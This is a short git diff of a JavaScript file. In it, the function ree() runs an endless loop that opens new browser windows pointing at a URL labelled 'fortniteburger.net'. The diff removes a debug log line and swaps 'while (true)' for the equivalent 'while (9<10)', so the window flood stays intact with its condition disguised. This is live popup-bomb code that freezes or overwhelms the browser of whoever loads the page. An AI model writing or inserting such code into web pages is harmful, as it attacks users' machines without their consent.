@@ -59,8 +59,7 @@ function workplease(newdealer){
 
 }
 function ree(){
-  console.log("hello ree hyas run")
-  while (true) {
+  while (9<10) {
     window.open(url,'fortniteburger.net');
   }
 }
